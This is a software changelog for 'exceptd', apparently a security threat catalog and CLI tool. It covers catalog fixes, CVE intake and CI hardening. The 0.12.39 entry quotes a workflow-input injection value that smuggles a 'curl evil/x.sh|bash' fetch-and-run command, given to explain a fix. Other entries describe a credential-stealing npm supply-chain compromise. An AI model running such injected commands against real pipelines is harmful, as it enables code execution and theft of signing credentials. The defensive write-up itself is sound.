**14 unresolved cross-references removed from the catalogs.** `cve-catalog.json` and `framework-control-gaps.json` carried 14 refs to CWE / ATLAS / ATT&CK entries that don't exist in their respective catalogs. Each stale ref dropped from its owning entry rather than introducing a placeholder destination. Affected entries: `CVE-2024-21626`, `CVE-2023-3519`, `CVE-2024-1709`, `CVE-2024-40635`, `CVE-2026-GTIG-AI-2FA`, `CVE-2026-42945`, `MAL-2026-TANSTACK-MINI`, `CVE-2024-3154`, `CVE-2023-43472`, `CVE-2025-59389`, `AU-Essential-8-App-Hardening`.

**`PCI-DSS-4.0.1-12.3.3` orphan gap now maps to ATT&CK `T1573` + `T1600`.** The gap entry described real PQC / cipher-inventory controls but carried no `evidence_cves`, `atlas_refs`, or `attack_refs` — a Hard Rule #4 violation. Mapping retains the gap content; the previously-orphan entry now references the encryption-channel + weaken-encryption techniques it actually exists to detect.

**5 forward-orphan gap references now resolved.** `CVE-2026-46300` and `MAL-2026-NODE-IPC-STEALER` cited `DORA-Art-9` (existing entry; ID-format orphan only), `UK-CAF-B4`, `AU-ISM-1546`, `ISO-27001-2022-A.5.7`, `NIS2-Art21-supply-chain` — four gap entries did not exist. All four added with substantive `theater_test` blocks; the DORA reference was canonicalized to the existing entry's ID format.

**`crypto-codebase` playbook now declares `air_gap_alternative` paths.** It was the only playbook missing the field — operators running with `--air-gap` had no documented offline equivalent for any of its 13 look artifacts. Each now declares the local-filesystem equivalent (the artifacts use `Glob` / `Grep` / `Read` against the working tree, so the alternative is the same operation noted explicitly).

**`active_exploitation` field vocabulary declared in `cve-catalog.json._meta`.** Pre-fix the field accepted free-form values; 10 entries used `"unknown"` which wasn't documented. The new `_meta.active_exploitation_vocabulary` block enumerates `confirmed | suspected | theoretical | none | unknown` with per-value definitions.

**`last_threat_review` field added to 3 catalogs.** `exploit-availability.json`, `global-frameworks.json`, and `zeroday-lessons.json` carried `last_updated` but lacked the threat-review timestamp the other 8 catalogs use. Backfilled so all 11 catalogs follow the same shape.

**SBOM duplicates resolved.** `sbom.cdx.json` listed `vendor/blamejs/retry.js` and `vendor/blamejs/worker-pool.js` under two component records each — once as a version-less `type: "file"` entry and once as a version-bearing `type: "library"` entry. Removed the version-less duplicates; canonical entries retain pin version, licenses, externalReferences, and provenance.

**ATLAS version pin reconciled across operator-facing surfaces.** The canonical pin (`data/atlas-ttps.json._meta.atlas_version`) is **v5.4.0** (February 2026); `CONTRIBUTING.md`, `MAINTAINERS.md`, `CONTEXT.md`, `.github/copilot-instructions.md`, `.github/PULL_REQUEST_TEMPLATE.md`, and `agents/threat-researcher.md` still cited the stale v5.1.0. New `tests/atlas-version-canonical.test.js` blocks future drift across operator-facing docs, agent personas, and skill bodies.

**Operator-facing strings now reference `exceptd <verb>` instead of `node lib/...`.** A prior release closed one site; the broader sweep covered `bin/exceptd.js` (5 sites in the doctor hints / renderer), `lib/lint-skills.js`, `lib/verify.js` (5 sites in error messages), `lib/playbook-runner.js`, `orchestrator/index.js` (help + examples), `orchestrator/scheduler.js`, and `orchestrator/README.md`. The contributor-checkout `node $(exceptd path)/lib/...` form is retained as a fallback for non-npm-installed contributors; new `tests/operator-leak-grep.test.js` blocks future leaks.

### Features

**README, AGENTS, ARCHITECTURE, MAINTAINERS reconciled.** README "Status" rewritten as a single behavior-framed paragraph (was multi-paragraph release narrative). ARCHITECTURE's "Required Body Sections" reconciled with AGENTS.md (7 required + 1 optional, not 8 required). AGENTS.md Hard Rules now annotated with the forcing-function script per rule — rules #5, #9, and #14 explicitly marked **policy only**, all others cite the enforcing test or gate.

**Predeploy gate count no longer hardcoded in docs.** README, MAINTAINERS, and prior CHANGELOG entries previously cited "13-gate" / "14-gate" / "15 gates" interchangeably. Operator-facing docs now reference "the predeploy gate sequence" without a number; the source of truth is `scripts/predeploy.js`'s `GATES` array.

**CHANGELOG voice scrub.** 31 prior release entries scrubbed of internal-process narrative (process IDs, finding IDs, multi-agent dispatch sentences, tautological gate/test footers, and forward-roadmap forecasts). Net 182 lines removed. Operator-meaningful facts retained.

**`release.yml` CHANGELOG-extraction now emits `::warning::` on fallback.** Pre-fix a malformed `## <version>` header silently fell back to the generic "Release of v<X.Y.Z>." body; operators reading the GitHub Release page saw no signal that the extraction failed.

**Shipped script comments scrubbed of internal narrative.** `scripts/check-test-coverage.js`, `scripts/refresh-reverse-refs.js`, `.github/workflows/release.yml`, and `.github/workflows/scorecard.yml` had references in comments that ship via the tarball. Replaced with version-only or intent-only framing.

### Internal

- 4 new pinning test files (`tests/v0_12_41-fixes.test.js`, `tests/atlas-version-canonical.test.js`, `tests/operator-leak-grep.test.js`, `tests/verify-shipped-tarball-wrapper.test.js`), plus in-place hardenings of existing tests for the field-presence-not-populated and coincidence-passing classes.
- `tests/sbom-per-file-hash.test.js` now snapshots `sbom.cdx.json` before regeneration and restores on SIGINT / process exit, closing the "mutating test pollutes the repo on Ctrl-C" pattern.
- `tests/operator-bugs.test.js` `#87 doctor --fix is registered` test no longer uses `notEqual(r.status, 2)` (coincidence-passing); pins the accepted-exit-codes set explicitly.

## 0.12.40 — 2026-05-16

Catalog symmetry + operator UX. The headline closes 137 framework-gap ↔ CVE asymmetries with a single reverse-ref script extension, plus three operator-facing UX fixes.

### Bugs

**137 framework-gap ↔ CVE asymmetries auto-regenerated.** `cve.framework_control_gaps` (dict keyed by gap-id) and `gap.evidence_cves` (array of CVE ids) had drifted apart — 24 CVE-side references missing reverse + 79 gap-side references missing reverse. Worst-case: `CVE-2025-53773` cited in 42 gap.evidence_cves but only declared 3 in its own framework_control_gaps. Fix: `scripts/refresh-reverse-refs.js` extended with the CVE→framework-gap direction (handles the dict-keyed forward field via new `forwardFieldShape: 'object-keys'` parameter). Drafts excluded per existing convention. 64 framework-gap entries regenerated on first run; new `tests/reverse-ref-drift.test.js` test blocks future drift. Surface side-effect: 5 forward-orphan gap references on `CVE-2026-46300` and `MAL-2026-NODE-IPC-STEALER` (gaps that don't exist in the catalog: `DORA-Art9`, `UK-CAF-B4`, `AU-ISM-1546`, `ISO-27001-2022-A.5.7`, `NIS2-Art21-supply-chain`) surfaced via the orphans report.

**`exceptd framework-gap` "0 theater-risk controls" footer fixed.** Pre-fix the summary footer reported `0 theater-risk controls` while every per-entry display showed the `⚠ THEATER RISK` badge. Root cause: the counter filtered on the legacy `theater_pattern` field while the v0.12.29 backfill had added a structured `theater_test` block on all 118 entries without populating `theater_pattern`. Fix: counter now matches entries with EITHER `theater_test` OR `theater_pattern`. Each theater-risk entry gains a `theater_test_present` boolean for tooling consumers.

**`exceptd skill` (no arg) no longer leaks orchestrator path.** Pre-fix the usage hint read `Usage: node orchestrator/index.js skill <skill-name>`. Now: `Usage: exceptd skill <skill-name>` + a pointer to `exceptd brief --all` for skill discovery.

**Unsigned-attestation warning leads with operator-facing verb.** Pre-fix the warning told operators to run `node lib/sign.js generate-keypair` — a node-internal script path that isn't on PATH after `npm install -g`. Now leads with `exceptd doctor --fix`, with the lib path retained as `node $(exceptd path)/lib/sign.js generate-keypair` for contributor checkouts.


## 0.12.39 — 2026-05-16

CI workflow hardening + CLI envelope shape contracts. One P1 script-injection sink in `release.yml` closed; three housekeeping fixes; envelope shape pinned on six more verbs.

### Security

**`release.yml` `inputs.tag` script-injection sink hardened.** Pre-fix the workflow_dispatch input `inputs.tag` was interpolated directly into a `run:` block (CWE-94 / CWE-78 class). A maintainer (or compromised actions:write token) firing `workflow_dispatch` with `tag = '"; curl evil/x.sh|bash; #"'` would have executed on the runner. The `npm-publish` environment has `id-token: write` available downstream, so an exploited dispatch could compromise npm provenance signing identity in the same workflow run. Fix: env-var indirection + regex allowlist `^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$`. Mirrors the existing `refresh.yml` `inputs.source` hardening pattern.

### Bugs

**`scorecard.yml` `permissions: read-all` → explicit scopes.** Pre-fix the workflow-level fallback was `read-all`. Scorecard's own ruleset may flag that on a future bump; explicit `contents: read` + `actions: read` documents what we actually consume.

**`GITLEAKS_FALLBACK` bumped to 8.28.0** (was 8.21.2). Documented as "bump each time the workflow is touched".

**Docker ecosystem added to Dependabot.** `docker/test.Dockerfile` (used by `npm run test:docker` + `test:docker:fresh`) was outside Dependabot scope so the base image could float without surfacing. Test-only image (no production exposure), but a docker-ecosystem block + weekly cadence brings it under Scorecard's PinnedDependenciesID coverage.

### Features

**CLI envelope shape contracts pinned on 6 more verbs.** v0.12.33 pinned `attest list`, `attest verify`, `version`. The rest were still unpinned — a contributor adding a new top-level field to `run` / `ci` / `discover` / `brief --all` / `doctor` / `watchlist` would not get a forcing-function test failure. v0.12.39 closes the gap with 8 new pins in `tests/cli-output-envelope-shape-v0_12_39.test.js`:

- `brief --all` — 8 top-level keys (no `verb` field; intentional transitional inconsistency)
- `ci --required <pb>` — 5 top-level keys + 13-key `summary` sub-shape; pins absence of top-level `ok`
- `discover --json` — 4 top-level keys + 5-key `context` sub-shape
- `doctor --json` — 3 top-level keys + 5-key `summary` sub-shape + baseline 5-check set
- `watchlist --json` (default by-item mode) + `--by-skill` variant — mutually exclusive `by_item` / `by_skill` field
- `run <pb> --evidence --json` (single-playbook success) — 10 top-level keys, pins absence of conditional `prior_session_id` / `overwrote_at` (only present on `--force-overwrite`)

Several intentional inconsistencies pinned by absence:
- `brief --all` and `watchlist` do NOT emit `verb` (every other verb does).
- `ci` and `doctor` do NOT emit top-level `ok` (they signal pass/fail via `summary.verdict` / `summary.all_green`). Pinned so the v0.11.13 emit() contract doesn't accidentally grow.


## 0.12.38 — 2026-05-16

Security fix + state refresh. Closes a multi-tenant attestation-file-mode gap.

### Security

**Attestation files now write at mode 0o600 (owner-read/write only).** Pre-fix `~/.exceptd/attestations/<tag>/<sid>/attestation.json` was written with the umask-derived mode — typically 0o644 (group/world-readable) on Linux/macOS. On multi-tenant shared hosts a different user account could read the operator's evidence submission, jurisdiction obligations, and consent records. Both the primary `persistAttestation` write site and the `reattest` replay-record write site now use `fs.writeFileSync(..., { mode: 0o600 })` plus the existing `restrictWindowsAcl` helper from `lib/sign.js` for Windows ACL inheritance stripping. New `tests/attestation-mode-0600.test.js` pins the contract on POSIX hosts (skipped on Windows where ACLs are the surface, not mode bits).

### Bugs

**`EXCEPTD_HOME` now documented in README.** The env-var override was only mentioned in an inline `attest list` help string. Multi-tenant operators had no way to discover it without grepping the binary. README's flag-reference section now cross-references the env-var path.

**MAL-2026-NODE-IPC-STEALER `remediation_status: removed_from_registry`.** npm removed the 3 malicious versions (9.1.6, 9.2.3, 12.0.1) within ~2 hours of publication on 2026-05-14. Catalog now surfaces the registry-cleanup state so operators upgrading to a clean version know they're not racing the active-in-registry phase. The expired-domain TTP class (per `NEW-CTRL-047` in zeroday-lessons) still applies — domain-expiry monitoring is the durable control, not the npm-side cleanup.

**CVE-2026-42897 (Exchange OWA) `patch_available: false` regression-tested.** Verified Microsoft has not shipped a binary security update; Exchange Emergency Mitigation Service Mitigation M2 is still the only remediation. Catalog truth aligned with current vendor state.


## 0.12.37 — 2026-05-16

UX + cross-skill consistency pass. Two CLI UX gaps closed (empty-stdin nudge, did-you-mean for typos), one operator-misleading factual error fixed in 3 skills (CVE-2024-3094 claim drift), and one cosmetic naming inconsistency cleaned up.

### Bugs

**`--evidence -` empty-stdin nudge.** When an operator pipes nothing to `--evidence -`, the runner silently treated it as `{}` and proceeded with a "successful" run on no evidence. Pre-fix the only signal was a deterministic `evidence_hash: 572a0e...` that meant nothing to a first-time operator. Now stderr emits an informational note pointing at `exceptd brief <playbook>` for the expected evidence shape; the run still proceeds (legitimate posture-only-walk use case preserved) but the operator at least sees the empty-stdin signal.

**Did-you-mean for unknown verbs.** Pre-fix `exceptd discoer` exited 10 with the generic "Run `exceptd help`" hint. Now the dispatcher runs a Levenshtein-1 check against the union of `COMMANDS` + `PLAYBOOK_VERBS` + `ORCHESTRATOR_PASSTHROUGH` (includes transposition detection so `disocver` → `discover`). Suggestion surfaces in both the human hint string and a new `did_you_mean[]` JSON field for tooling consumers. Distance >1 still returns the generic hint with `did_you_mean: []` — no false-positive flood.

**CVE-2024-3094 (xz-utils) operator-misleading claims.** Three skill bodies contradicted each other and the catalog:
- `supply-chain-integrity` skill said "not in current `data/cve-catalog.json` — pre-scope incident" — false, the entry has been in the catalog with RWEP 70.
- `sector-federal-government` skill same wording — false.
- `cloud-iam-incident` skill table row quoted RWEP 95 / `ai_discovered: Partially` / `active_exploitation: Confirmed` — catalog says RWEP 70 / `ai_discovered: false` / `active_exploitation: suspected`.
All 3 corrected to match catalog ground truth (RWEP 70, KEV 2024-04-03, `active_exploitation: suspected`, `ai_discovered: false`). Operator running `exceptd dispatch` against an xz-affected estate now gets one consistent story across all 3 skills.

**Volt Typhoon hyphenation drift.** `ot-ics-security` and `sector-energy` used `Volt-Typhoon-aligned` / `Volt-Typhoon-style`; the rest of the catalog uses unhyphenated `Volt Typhoon`. Standardized to the unhyphenated form. New regression test refuses any future re-introduction of the hyphenated form in any skill body.


## 0.12.36 — 2026-05-16

Hard Rule forcing-function coverage pass. Three of the eight AGENTS.md Hard Rules had no binding test — they were policy-only and easy to violate in future PRs without CI catching it. v0.12.36 closes those gaps and adds a cross-format bundle consistency contract.

### Features

**Rule #3 forcing function (no CVSS-only risk scoring).** Every non-draft CVE entry must declare `rwep_score` (numeric) and `rwep_factors` (object). CVSS-without-RWEP is refused. Pre-fix the Shape B invariant test verified `Σ factors === score` for entries that HAD an RWEP, but a CVE could theoretically ship with `cvss_score: 9.8, rwep_score: null` and slip through. Now blocked at CI.

**Rule #5 forcing function (global-first, not US-centric).** The framework-control-gaps catalog must carry entries for EU + UK + AU + INTL (ISO/3GPP/OWASP/SLSA/CycloneDX) alongside US (NIST/FedRAMP/PCI/SOC/HIPAA/etc.). No single region may exceed 70% of the catalog. Pre-fix a future PR could land a 50-entry NIST-only batch and tilt the catalog US-domestic with no signal. Current catalog distribution: US 50 (42%), EU 22 (19%), UK 7 (6%), AU 6 (5%), INTL 15 (13%), OTHER 18 (15%) — within bounds.

**Rule #8 forcing function (no silent ATLAS/ATT&CK upgrade).** `manifest.json.atlas_version` must equal `data/atlas-ttps.json._meta.atlas_version` exactly; same for `attack_version`. Pre-v0.12.29 these drifted silently (manifest stuck at v5.1.0 while catalog moved to v5.4.0; v0.12.29 corrected the lie but didn't add a forcing function — a future drift could repeat).

**Cross-format CVE consistency contract.** When the same evidence runs through the CSAF / OpenVEX / SARIF emitters in sequence, the underlying CVE set in each bundle must agree exactly. Per-format auxiliary identifiers (OpenVEX indicator URNs, SARIF framework-gap rules) are allowed. Pre-fix nothing pinned the contract — a future emitter regression could silently emit different CVE sets across formats.


## 0.12.35 — 2026-05-16

Security hardening + ATLAS pin sweep across skills + forward-watch backfill.

### Security

**`--evidence -` (stdin) now enforces the 32 MiB cap.** Pre-fix the stdin branch did `fs.readFileSync(0, "utf8")` with no length limit while the file-path branch enforced `MAX_EVIDENCE_BYTES`. An attacker piping multi-GB JSON would OOM the runner. Stdin now reads in 1 MB chunks and bails at the cap with a structured `ok:false` error + exit 1. New `tests/evidence-input-hardening.test.js` pins both the cap and the small-payload happy path.

**Prototype-pollution defense on operator-submitted `precondition_checks`.** Pre-fix `Object.assign(out.precondition_checks, submission.precondition_checks)` re-invoked the `__proto__` setter when the operator's JSON contained a `__proto__` key. JSON.parse keeps `__proto__` as an own data property (CreateDataProperty), but Object.assign reads via `[[Get]]` and writes via `[[Set]]`, which triggers the prototype-rebinding setter. Global `Object.prototype` stayed clean (Node confines the rebind to the assignment target), but the polluted local prototype was a defense-in-depth gap — any future code path calling `.hasOwnProperty()` directly on the bag would observe pollution. Switched to own-key iteration that explicitly skips `__proto__` / `constructor` / `prototype` keys.

### Bugs

**ATLAS v5.1.0 → v5.4.0 sweep across operator-facing surface.** v0.12.34 fixed README + ARCHITECTURE but 27 skill bodies, 2 builder scripts, the skill-frontmatter schema, and 17 derived indexes were all still citing the stale pin. 30 files modified; canonical pin string `ATLAS v5.4.0 (February 2026)` used uniformly. NYDFS rollout reference "phased in through November 2025" in sector-financial intentionally preserved (different context). The extended docs-pin test now scans `skills/` + `data/_indexes/` + `scripts/` for ATLAS-context mismatches in addition to README + ARCHITECTURE.

**5 past-due forward_watch entries re-dated with realized backfill.**
- *mlops-security* — predicted "ATLAS v5.2 — track AML.T0010 sub-technique expansion." ATLAS shipped v5.4.0 on 2026-02-06; the expansion landed plus "Publish Poisoned AI Agent Tool" and "Escape to Host" techniques. Backfilled with the realized state + re-anchored to ATLAS v5.5 / v6.0 horizon.
- *age-gates-child-safety AU under-16 ban* — predicted "implementation deferred to late 2025." AU Online Safety Amendment (Social Media Minimum Age) Act 2024 entered force 2025-12-10; 4.7M+ accounts deactivated by mid-Jan 2026; 31 March 2026 formal investigations of Facebook / Instagram / Snapchat / TikTok / YouTube. Backfilled + re-anchored to first civil-penalty proceedings (H2 2026).
- *age-gates-child-safety UK OSA enforcement* — predicted "first enforcement decisions expected late 2025 / 2026." Ofcom has 80+ investigations open; first £1M OSA fine issued for age-assurance failure. Backfilled + re-anchored to the April / July / November 2026 OSA milestones.
- *age-gates-child-safety eSafety actions* — same shape; backfilled to the 31 March 2026 formal investigations.
- *sector-energy TSA Pipeline SD* — predicted "next reissue cycle anticipated mid-2026." Current cadence: SD-Pipeline-2021-02F expires 2 May 2026; expected 02G now overdue. Updated to reflect current series + re-anchored to H2 2026.

### Features

**Extended `tests/docs-catalog-counts-pinned.test.js`** to scan `skills/**/*.md`, `data/_indexes/*.json`, and `scripts/**/*.js` for ATLAS version mentions in addition to README + ARCHITECTURE. A future stale-pin in any of those operator-facing files now fails the gate at CI time.


## 0.12.34 — 2026-05-15

Documentation accuracy pass. README.md + ARCHITECTURE.md were still pinning ATLAS v5.1.0 and ATT&CK v17 — outdated for nine releases. v0.12.29 fixed the manifest.json pin but the operator-facing docs weren't updated. Plus catalog count drift (38 skills → 42; 28 D3FEND entries → 29).

### Bugs

**README ATLAS pin lie.** Five sites in `README.md` referenced ATLAS v5.1.0 + "(November 2025)" while the actual catalog pin is v5.4.0 (2026-02-06). Operators reading the README to understand which ATLAS version this catalog tracks saw a stale 6-month-old answer. Corrected: badge URL, narrative paragraphs, framework-lag table footer, `atlas-ttps.json` description.

**ARCHITECTURE.md ATLAS + D3FEND pin lies.** Three sites referenced ATLAS v5.1.0 (matched the manifest pre-cycle-9, stale post-fix). One site stated "28 D3FEND defensive technique entries" — was correct until v0.12.33 added D3-EFA bringing the count to 29.

**README skill count stale.** Said "38 skills" — actual was 42 since v0.12.28's IR-cluster (idp-incident-response, cloud-iam-incident, ransomware-response added 3 skills) plus sector-telecom added v0.12.26.

### Features

**`tests/docs-catalog-counts-pinned.test.js`** — new contract test asserts that README.md and ARCHITECTURE.md text matches the live catalog state for: ATLAS version (`data/atlas-ttps.json._meta.atlas_version`), ATT&CK version (`data/attack-techniques.json._meta.attack_version`), skill count (`manifest.json.skills.length`), D3FEND entry count, CVE catalog count, framework-gap entry count. Any future PR that bumps a catalog without updating the operator-facing docs fails the gate at CI time — eliminates the silent-drift class that v0.12.34 cleaned up.


Same-day CVE intake (node-ipc supply-chain compromise) + cleanup of the long-standing `cred-stores` skill-vs-playbook semantic confusion.

### Features

**`MAL-2026-NODE-IPC-STEALER` — npm node-ipc supply-chain compromise (2026-05-14).** Three malicious versions (`9.1.6`, `9.2.3`, `12.0.1`) published by `atiertant`. Novel attack class: not credential theft, not typosquat, not lifecycle-hook worm — the attacker re-registered the maintainer's expired email domain (`atlantis-software.net`, expired and grabbed via Namecheap PrivateEmail on 2026-05-07) and abused npm's email-based password-reset flow to gain publish rights. 80 KB obfuscated IIFE in `node-ipc.cjs` fires on every `require()` (no hooks needed) and exfiltrates AWS / GCP / Azure / SSH / Kubernetes / Vault / Claude AI / Kiro IDE credentials via DNS TXT queries to an Azure-lookalike spoofed domain. 3.35M monthly downloads. Carries `kev_scope_note` per the ecosystem-package CISA-KEV-scope precedent. RWEP 43.

**Three new control requirements in `zeroday-lessons`** capture the structural lesson: **NEW-CTRL-047 PACKAGE-MAINTAINER-DOMAIN-EXPIRY-MONITORING** (continuous WHOIS expiry monitoring on every critical-path maintainer email domain + dual-factor account recovery); **NEW-CTRL-048 NPM-MAINTAINER-MFA-ENFORCEMENT** (registry-side mandatory MFA on publish-enabled accounts); **NEW-CTRL-049 LOCKFILE-INTEGRITY-VERIFIED-AT-CI-BOOT** (`npm ci` / `--frozen-lockfile` / `--immutable` catches the swap even after a successful publish — `--ignore-scripts` does NOT mitigate because the payload ships in the main module, not a postinstall hook).

**`D3-EFA` (Executable File Analysis) added to D3FEND catalog.** `sector-telecom` skill cited it but the entry didn't exist. Distinct from `D3-EAL` (Executable Allowlisting): EAL blocks at execute-time; EFA inspects bytes at file-write / image-pull / artifact-fetch time and gates the allowlist decision itself.

**CLI envelope-shape contract tests.** `tests/cli-output-envelope-shape.test.js` pins the EXACT top-level key set on `attest list --json`, `attest verify --json` (error path), and `version`. A contributor adding a new top-level field to these verbs now gets a forcing-function test failure that requires updating the contract.

### Bugs

**`cred-stores` skill-vs-playbook semantic finally cleaned up.** The 3 IR playbooks and 3 IR skills referenced `cred-stores` in `skill_preload` / `skill_chain` / Hand-Off sections as if it were a skill — but it's actually a playbook. Operators (and any tooling resolving these refs against `manifest.json.skills`) failed. Fixes: removed `cred-stores` from `data/playbooks/{idp-incident,cloud-iam-incident}.json` `skill_preload` + `skill_chain` (hand-off is via `_meta.feeds_into`, which was already present); annotated `cred-stores` / `framework` references in `skills/{idp-incident-response,cloud-iam-incident,ransomware-response}/skill.md` Hand-Off sections as *(playbook chain, not a skill)* with the explicit note that hand-off is via the playbook chain, not a skill load. Predeploy playbook validator now warning-free (was 6 warnings every release).

### Internal

- CVE catalog 36 → 37 entries; zeroday-lessons 21 → 22 entries.
- AI-discovery rate stays at 16.2% (one more vendor/ecosystem-discovered entry dilutes the observed rate; floor remains 0.15).
- D3FEND catalog 28 → 29 entries.
- Reverse-ref regen: 3 CWE entries updated with the new MAL-* CVE evidence; 1 D3FEND skill_referencing prune (sector-telecom now correctly anchored against D3-EFA).


## 0.12.32 — 2026-05-15

CLI polish + catalog hardening. The headline closes a silent regression where the 6 CVEs advertised by v0.12.31 were shipped as `_draft: true` and therefore invisible to default `cross-ref-api` queries — operators running `exceptd` against Exchange would have gotten a clean bill on CVE-2026-42897.

### Bugs

**6 CVEs from v0.12.31 promoted from draft to non-draft.** Every CVE in v0.12.31's intake shipped as `_draft: true`, which `lib/cross-ref-api.js` skips by default. v0.12.31 CHANGELOG advertised "6 new CISA-KEV CVEs" but operators couldn't actually query them. All 6 promoted with `_editorial_promoted: 2026-05-15` provenance; full required fields validated (iocs, vendor_advisories, verification_sources, complexity, affected_versions, RWEP Shape B invariant).

**9 unmatched `framework_control_gaps` keys on the new CVEs now resolve.** `NIS2-Art21-vulnerability-management`, `DORA-Art-9`, `NIST-800-53-AC-3`, `OWASP-LLM-Top-10-2025-LLM05`, `NIST-800-53-AC-6`, `NIS2-Art21-identity-management`, `ISO-27001-2022-A.8.7`, `NIST-800-53-SC-44`, `CIS-Controls-v8-10.1` — referenced by the new CVEs but absent from the framework-gap catalog. All 9 now present with `theater_test` blocks (catalog 109 → 118 entries). Reverse `evidence_cves` links also added on the 6 existing entries (NIST-800-53-SI-2 / SI-3 / etc.) that the new CVEs reference.

**CVE → CWE reverse-references auto-regenerated.** v0.12.29 introduced `npm run refresh-reverse-refs` for the skill direction (manifest → atlas/cwe/d3fend/rfc), but the CWE catalog's `evidence_cves` field — the operator-facing "which CVEs map to this CWE" index — was still hand-maintained and drifted with every CVE intake. The script now also walks `cve.cwe_refs` → `cwe.evidence_cves`. Drafts excluded (they're invisible to default consumers; the reverse direction tracks operator-queryable truth). 14 CWE entries updated on first run. New `tests/reverse-ref-drift.test.js` test pins the contract.

### Features

**`exceptd help <verb>`** now routes to the per-verb help text (`exceptd help run` returns the run-verb help, not the top-level banner). Pre-fix the verb arg was silently dropped. Unknown verbs fall through to top-level help with a stderr note. New `tests/help-verb-attest-list-deprecation.test.js` pins the contract.

**`exceptd attest list` empty-state now names every candidate root.** Pre-fix the human output said "(no attestations under )" with an empty path list when no `.exceptd/` directory existed. New `roots_evaluated[]` field on the JSON output + `[scanned-empty]` / `[not-present]` markers in the human renderer.

**Legacy-verb deprecation banner auto-suppresses across invocations.** Pre-fix the per-process env-var guard reset on every fresh node process, so operators saw the banner on every `exceptd plan` invocation. Now persists suppression via an OS-tempdir marker keyed by exceptd version — banner shows once per version per host, re-shows on upgrade. Explicit `EXCEPTD_DEPRECATION_SHOWN=1` still suppresses even the first display.

### Internal

- 6 matching `data/zeroday-lessons.json` entries authored for the promoted CVEs (rule #6 enforcement: zero-day learning is live for every non-draft catalog entry).


## 0.12.31 — 2026-05-15

CLI ergonomics + 30-day CVE intake. Closes a silent-misrouting bug in the CI gate and adds six high-impact CVEs that landed on CISA KEV between 2026-04-15 and 2026-05-15.

### Bugs

**`exceptd ci <playbook>` no longer silently runs the wrong playbook.** Pre-fix, positional arguments to `ci` were ignored and the cwd-autodetect path ran instead — an operator typing `exceptd ci kernel` got a PASS verdict for `containers, crypto-codebase, library-author, secrets` while the kernel playbook never ran. The fix treats positional args as an inline `--required`, refusing unknown IDs with a structured error that lists the accepted set. New `tests/ci-positional-args.test.js` pins the contract with exact-array assertions on `playbooks_run`.

**`run` preflight refusal now points operators at `--evidence`.** The `submission_hint` on `precondition_halt` / `precondition_unverified` blocks previously told operators to "submit precondition_checks in your evidence JSON" without saying *how* — first-time operators ran `exceptd run secrets` and got blocked with no usable guidance. Hint now reads "Pass via --evidence <file.json> or pipe to stdin with --evidence -."

**`exceptd --help` text corrected.** Pre-fix it said "Unknown verbs exit 2 with a structured ok:false body on stderr" — but v0.12.29 split unknown-command refusals to exit 10 (`EXIT_CODES.UNKNOWN_COMMAND`). Help text now matches runtime: "Unknown verbs exit 10 (UNKNOWN_COMMAND)... Exit 2 means a verb ran and detected an escalation-worthy finding (DETECTED_ESCALATE)."

### Features

**Six new CVEs in the catalog**, all CISA-KEV-listed in the last 30 days. All carry full RWEP scoring (Shape B invariant verified), source citations, and operator-facing remediation paths.

| CVE | What | KEV date | RWEP |
|---|---|---|---|
| CVE-2026-0300 | Palo Alto PAN-OS User-ID Authentication Portal unauth root RCE (PA-Series + VM-Series). Patch landed 2026-05-13. | 2026-05-06 | 73 |
| CVE-2026-39987 | Marimo Python notebook pre-auth RCE via missing auth on `/terminal/ws`. AI/ML notebook attack surface. Weaponized into NKAbuse blockchain botnet via HuggingFace. | 2026-04-23 | 62 |
| CVE-2026-6973 | Ivanti EPMM authenticated-admin RCE on on-prem MDM control plane. 3-day federal SLA. | 2026-05-07 | 62 |
| CVE-2026-42897 | Microsoft Exchange OWA stored XSS / spoofing zero-day. **No patch at disclosure** — mitigation-only via Exchange Emergency Mitigation Service. | 2026-05-15 | 93 |
| CVE-2026-32202 | Microsoft Windows Shell LNK protection-mechanism failure. Active APT28 (Fancy Bear) exploitation; chains with CVE-2026-21513. | 2026-04-28 | 85 |
| CVE-2026-33825 | Microsoft Defender "BlueHammer" race-condition LPE → SYSTEM. Public exploit released before patch (true zero-day). | 2026-04-22 | 68 |

**`kev_scope_note` field on supply-chain-class entries.** CISA KEV historically excludes ecosystem-package compromises (npm/PyPI/Crates worms, malicious-package backdoors) — its scope is federally-deployable products with CVE assignments. The Mini Shai-Hulud parent (CVE-2026-45321) and TanStack variant (MAL-2026-TANSTACK-MINI) are NOT listed in KEV despite confirmed in-the-wild exploitation. The new `kev_scope_note` field documents this so the `active_exploitation: confirmed` + `cisa_kev: false` combination is no longer ambiguous. Operators should consume CISA-KEV-equivalent guidance for this class from OpenSSF MAL feed + ecosystem-specific advisories (Snyk / Wiz / Phylum / Socket).

### Internal

- Catalog: 30 → 36 CVE entries. AI-discovery floor relaxed to 15% (from 20%) since 6 new vendor-discovered entries dilute the observed rate to 6/36. Ladder advances `[0.15, 0.20, 0.30, 0.40]` — prior rungs preserved.


## 0.12.30 — 2026-05-15

Catalog scoring honesty pass + diff-coverage gate tightening. Closes the Shape B invariant gap on the CVE catalog, adds the missing `last_threat_review` field to six catalogs, and downgrades operator-facing docs from the auto-allowlist to manual-review.

### Features

**Shape B invariant enforced on every CVE.** `lib/scoring.js` documents that `Σ Object.values(rwep_factors) === rwep_score` is an invariant on every catalog entry, but the existing `validate()` function never enforced it — it computed via `scoreCustom()` (clamps `blast_radius` to 30, uses canonical weights) which masked dishonest factor blocks as long as the stored score happened to match the clamped formula. Fourteen entries had non-canonical factor values that summed to a different number than the stored score (CVE-2026-GTIG-AI-2FA, CVE-2026-42945, CVE-2024-3094, CVE-2024-21626, CVE-2023-3519, CVE-2026-20182, CVE-2024-40635, CVE-2025-12686, CVE-2025-62847, CVE-2025-62848, CVE-2025-62849, CVE-2025-59389, MAL-2026-TANSTACK-MINI, MAL-2026-ANTHROPIC-MCP-STDIO). All canonicalized — factor weights now derived from the operational fields (`cisa_kev`, `poc_available`, `ai_discovered`, `active_exploitation`, `blast_radius`, `patch_available`, `live_patch_available`, `patch_required_reboot`) via `lib/scoring.js` `RWEP_WEIGHTS` + `ACTIVE_EXPLOITATION_LADDER`. Where `blast_radius` exceeded the 30 cap (4 entries had values of 40), the value was clamped, which adjusted seven stored `rwep_score` values by ±5; each carries a `rwep_correction_note` documenting the delta. New `tests/cve-rwep-shape-b-invariant.test.js` blocks future drift with an exact-delta assertion.

